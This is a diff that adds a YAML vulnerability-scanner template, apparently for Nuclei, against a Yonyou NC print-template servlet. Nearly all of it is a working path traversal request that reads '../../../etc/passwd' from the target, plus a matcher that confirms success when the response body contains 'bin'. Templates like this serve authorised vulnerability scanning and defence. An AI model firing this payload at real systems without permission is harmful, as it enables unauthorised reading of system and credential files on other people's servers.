@@ -1,0 +1,26 @@
+id: yongyouufidanc-PrintTemplateFileServletfilePath-fileread
+
+info:
+  name: yongyouufidanc-PrintTemplateFileServletfilePath-fileread
+  author: xiaokp7
+  severity: high
+
+
+http:
+  - raw:
+    - | 
+      GET /servlet/~uapweb/nc.lfw.billtemplate.servlet.PrintTemplateFileServletfilePath=../../../etc/passwd HTTP/2
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+      Accept: image/avif,image/webp,*/*
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate, br
+      Sec-Fetch-Dest: image
+      Sec-Fetch-Mode: no-cors
+      Sec-Fetch-Site: same-origin
+      Te: trailers
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"bin")'
